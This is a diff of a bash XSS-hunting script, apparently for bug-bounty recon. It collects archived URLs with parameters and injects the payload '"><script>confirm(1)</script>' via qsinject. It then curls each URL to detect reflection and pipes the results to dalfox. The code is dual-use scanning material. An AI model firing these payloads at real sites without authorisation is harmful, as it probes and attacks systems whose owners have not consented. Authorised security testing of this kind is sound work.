@@ -38,58 +38,71 @@ banner(){
 }
 ####Add Functions Here
 
-XSSURLSCAN(){
-    #credit: hacktify
-    read -p 'URL: ' URL
+parametercrawler(){
+    echo -e
+    read -p "${RED}URL: ${RESET}" URL && echo -e
     #read -p 'Add Custom Parameter like source= ' cparam
     #read -p 'BXSS Hunter URL; xss.ht' bxss
 
     ##waybackurl
+    echo -e
     waybackurls $URL > $project/$project-all-urls.log
-    echo "${GREEN}Done with Waybackurls${RESET}"
-
-    ##kxss
-    echo "${GREEN}[+kxss] Waybackurl Output file > Sorting > Running KXSS and piping it to Dalfox${RESET}"
-    #echo "${CYAN}${WUL}cat $project/$project-all-urls.log | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u | dalfox pipe --output $project/first.txt${RESET}"
-    #cat $project/$project-all-urls.log | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u | dalfox pipe --output $project/first.txt
-
+    echo "[${GREEN}I${RESET}] Done with Waybackurls${RESET}"
     
-    cat $project/$project-all-urls.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | sed 's/=.*/=/'| sort -u > $project/uniqueparam.txt && echo uniqueparam.txt >> $project/tmplist
-    cat $project/uniqueparam.txt | gf xss > $project/gfxss.txt && echo gfxss.txt >> $project/tmplist
-    cat $project/gfxss.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u > $project/kxss.txt && echo kxss.txt >> $project/tmplist
+    #Stripping
+    echo -e
+    cat $project/$project-all-urls.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" > $project/uniqueparam.txt && echo -e uniqueparam.txt >> $project/tmplist
+    echo "[${GREEN}I${RESET}]Extracted URL with Valid Parameters${RESET}"
+}
+
+dpayloadinjector(){
+    ##dpayload
+    cat $project/uniqueparam.txt | qsinject -i '"><script>confirm(1)</script>' -iu -decode > $project/qsinject.txt && echo qsinject.txt >> $project/tmplist
+    echo -e
+    echo "[${RED}+${RESET}] ${GREEN}Waybackurl Output file > qsinject > running with default payload...${RESET}"
+    echo -e
+    echo "${CYAN}${WUL}curl --silent --path-as-is --insecure [eachline] | grep -qs '<script>confirm(1) && echo Vulnerable [each-line] && echo [each-line] >> $project/xss-poc-2.txt${RESET}"
+
+    file="$project/qsinject.txt"
+    while IFS= read line
+        do
+            curl --silent --path-as-is --insecure "$line" | grep -qs "<script>confirm(1)" && echo ${RED}Vulnerable${RESET} $line && echo "$line" >> $project/xss-poc-2.txt
+        done <"$file" 
+}
+
+XSSURLSCAN(){
+        
+    cat $project/uniqueparam.txt | gf xss > $project/gfxss.txt && echo -e gfxss.txt >> $project/tmplist
+    cat $project/uniqueparam.txt | /root/go/bin/kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u > $project/kxss.txt && echo kxss.txt >> $project/tmplist
     
+    echo -e
     echo "${MAGENTA}Total Count...${RESET}"
     echo -n "$project-all-urls.log.txt : " & cat $project/$project-all-urls.log | wc -l
     echo -n "uniqueparam.txt : " & cat $project/uniqueparam.txt | wc -l 
+    echo -n "qsinject.txt : " & cat $project/qsinject.txt | wc -l
     echo -n "gfxss.txt : " & cat $project/gfxss.txt | wc -l
     echo -n "kxss.txt : " & cat $project/kxss.txt | wc -l
-
-    echo "${MAGENTA}Choose which results to run with dalfox...${RESET}"
+    
+    echo -e
+    echo "${RED}Choose which results to run with dalfox...${RESET}"
     select d in $(<$project/tmplist);
     do test -n "$d" && break; 
     echo ">>> Invalid Selection"; 
     done
     firstv=$d
+    echo -e
     echo "Filename: ${BLUE}$project/$firstv ${RESET}" && cat $project/$firstv
     echo "${BLUE}Piping Dalfox on $project/$firstv! ${RESET}"
-    echo "${CYAN}${WUL}cat $project/$firstv | dalfox pipe --output $project/first.txt${RESET}"
+    echo -e
+    echo "${CYAN}${WUL}cat $project/$firstv | dalfox pipe --output $project/xss-poc.txt${RESET}"
     
     #running here
-    cat $project/$firstv | dalfox pipe --output $project/first.txt
-
-    ##dpayload
-    echo "${GREEN}[+dpayload] Waybackurl Output file > greping parameters with = > running with default payload...${RESET}"
-    cat $project/uniqueparam.txt | qsreplace '"><script>confirm(1)</script>' | tee $project/$project-combinedfuzz.json && cat $project/$project-combinedfuzz.json 
-    echo "${CYAN}${WUL}curl --silent --path-as-is --insecure $line | grep -qs <script>confirm(1) && echo Vulnerable $line\n && echo $line\n >> $project/second.txt ${RESET}"
-
-    file="$project/$project-combinedfuzz.json"
-    while IFS= read line
-        do
-            curl --silent --path-as-is --insecure "$line" | grep -qs "<script>confirm(1)" && echo ${RED}Vulnerable${RESET} $line\n && echo "$line\n" >> $project/second.txt
-        done <"$file" 
-
-    echo "${RED}>>>>JOOOOOOOODDDDDDDDDDD!!!!!<<<< ${RESET}"
+    echo -e
+    cat $project/$firstv | dalfox pipe --output $project/xss-poc.txt
+    echo -e
+    echo "${MAGENTA}>>>>JOOOOOOOODDDDDDDDDDD!!!!!<<<< ${RESET}"
 }
+
 
 #Menu options
 options[0]="Run XSS Scan on Single URL"
@@ -113,6 +126,12 @@ function MENU {
     echo "$ERROR"
 }
 
+JOD_XSS(){
+    parametercrawler 
+    dpayloadinjector
+    XSSURLSCAN
+}
+
 #Menu loop
 while MENU && read -e -p "Select the desired options using their number (again to uncheck, ENTER when done): " -n1 SELECTION && [[ -n "$SELECTION" ]]; do
     clear
@@ -133,8 +152,8 @@ done
 function ACTIONS {
     if [[ ${choices[0]} ]]; then
         #Option 1 selected
-        echo "Option 1 selected; Running XSS Scan on Single URL"
-	    XSSURLSCAN
+        echo "Option 1 selected; Need a Single URL"
+	    JOD_XSS
     fi
     if [[ ${choices[1]} ]]; then
         #Option 2 selected
@@ -154,29 +173,18 @@ function ACTIONS {
 }
 
 projectdirectorycheck(){
-    read -p 'Project Name: ' project
+    read -p "${RED}Project Name: ${RESET}" project
     echo $project
 
     if [ -d $project ]
     then
-        echo -e "${BLUE}[-] $project Directory already exists...${RESET}"
+        echo -e
+        echo -e "[${RED}I${RESET}] $project Directory already exists...${RESET}"
     else
-        echo -e "${BLUE}[+] Creating $project directory.${RESET}"
         mkdir -p $project
     fi
 }
 
-echo -e ${CP}"[+] Checking Internet Connectivity"
-if [[ "$(ping -c 1 8.8.8.8 | grep '100% packet loss' )" != "" ]]; then
-  echo "No Internet Connection"
-  exit 1
-  else
-  echo "Internet is present"
-  
-fi
-
 banner
 projectdirectorycheck
 ACTIONS
-
-
